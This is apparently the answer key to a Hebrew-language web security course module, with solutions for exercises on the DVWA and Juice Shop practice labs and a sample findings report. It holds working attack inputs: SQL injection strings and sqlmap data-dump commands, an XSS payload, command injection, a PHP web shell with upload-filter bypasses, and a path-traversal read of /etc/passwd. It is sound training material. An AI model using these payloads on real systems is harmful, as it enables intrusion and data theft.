<div dir="rtl">

# ✅ פתרונות מלאים — מודול 9: אבטחת Web

> נסה לבד ב-[`missions.md`](missions.md) קודם. כל הפעולות על סביבות תרגול חוקיות בלבד.

---

## חלק א' — הקמה והיכרות

**9.1**
```bash
sudo apt install docker.io -y && sudo systemctl start docker
sudo docker run -d -p 80:80   vulnerables/web-dvwa      # DVWA  → http://localhost
sudo docker run -d -p 3000:3000 bkimminich/juice-shop   # Juice Shop → http://localhost:3000
```
ב-DVWA: התחבר `admin`/`password` → "Create/Reset Database" → הגדר **DVWA Security = Low**. עכשיו שני היעדים מוכנים.

**9.2** — Burp: `Proxy → Intercept on`; Firefox עם Proxy `127.0.0.1:8080`. בצע התחברות — הבקשה תיתפס עם הפרמטרים `email`/`password` (Juice Shop) או `username`/`password` (DVWA).

**9.3** — לחץ ימני על הבקשה → **Send to Repeater** → לשונית Repeater → שנה ערך → **Send**. תגובת השרת מתעדכנת — כך בודקים ידנית.

---

## חלק ב' — Injection

**9.4** — בשדה המשתמש הזן `' OR '1'='1' -- ` (סיסמה כלשהי).
**למה זה עובד:** השאילתה הופכת ל-`SELECT * FROM users WHERE username='' OR '1'='1' -- '...`. התנאי `'1'='1'` תמיד אמת, וה-`-- ` מבטל את בדיקת הסיסמה → מתחברים כמשתמש הראשון (לרוב admin).

**9.5** — על **DVWA** (עמוד SQL Injection). הדרך הקלה: ב-Burp שמור את הבקשה לקובץ `request.txt` (היא כוללת את ה-Cookie וה-session), ותן אותה ל-sqlmap:
```bash
sqlmap -r request.txt --batch --dbs          # רשימת בסיסי הנתונים
sqlmap -r request.txt --batch -D dvwa --tables
sqlmap -r request.txt --batch -D dvwa -T users --dump   # שולף שמות משתמש + hashes
# חלופה ישירה (עם ה-Cookie מהדפדפן):
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<...>; security=low" --batch --dbs
```

**9.6** — הזרקת `<script>alert('XSS')</script>`:
- אם ה-alert קופץ **מיד** אחרי השליחה בלבד (בתגובה שלך) → **Reflected**.
- אם הוא נשמר ומופיע **בכל פעם שטוענים את הדף** (וגם למשתמשים אחרים) → **Stored**. קובעים לפי האם ה-payload נשמר בשרת.

**9.7** — קלט `127.0.0.1; whoami` בדף ה-ping מחזיר את פלט ה-`ping` **וגם** את שם המשתמש (`www-data`). **למה חמור:** זו הרצת פקודות מרחוק (**RCE**) — אפשר להריץ `cat /etc/passwd`, להוריד Reverse Shell, ולהשתלט על השרת.

---

## חלק ג' — Access Control ו-Upload

**9.8** — שנה `?id=1` ל-`?id=2` (וכו'). אם אתה רואה נתונים של משתמש אחר — זו **IDOR**. הפתרון בצד המפתח: בדיקת הרשאה בשרת שהמשאב שייך למשתמש המחובר.

**9.9**
```php
<?php system($_GET['cmd']); ?>
```
העלה כ-`shell.php`. אם נחסם: נסה `shell.php.jpg`, `shell.pHp`, או שנה את `Content-Type` ל-`image/jpeg` ב-Burp. גישה: `http://site/uploads/shell.php?cmd=whoami` → RCE.

**9.10** — `?file=../../../../etc/passwd` מחזיר את תוכן `/etc/passwd` (רשימת המשתמשים) → **LFI**. מאשש שהאפליקציה כוללת קבצים לפי קלט לא מסונן.

---

## 🔴 אתגר מסכם — מבנה דוח לדוגמה

```markdown
# דוח בדיקת Web — OWASP Juice Shop

## ממצא 1: SQL Injection בחיפוש מוצרים — חומרה: Critical
תיאור: פרמטר q פגיע ל-SQLi. PoC: sqlmap שלף את טבלת Users כולל hashes.
תיקון: Prepared Statements / ORM.

## ממצא 2: Broken Access Control (גישת admin) — חומרה: High
תיאור: ניתן להגיע ל-/#/administration ללא הרשאת admin.
PoC: [צילום מסך]. תיקון: בדיקת הרשאה בצד השרת.

## ממצא 3: Stored XSS בביקורות — חומרה: High
תיאור: תגובה עם <script> נשמרת ורצה לכל צופה.
תיקון: Output Encoding + CSP.

## ממצא 4: IDOR בסל הקניות — חומרה: Medium
תיאור: שינוי id חושף סל של משתמש אחר.
תיקון: אימות בעלות על המשאב.

## סיכום
הקריטי ביותר: ה-SQLi (חשיפת מסד הנתונים כולו). לתיקון מיידי.
```

> עברת? יש לך דוח Web אמיתי לתיק העבודות. המשך ל[מודול 10](../10-buffer-overflow/).

</div>
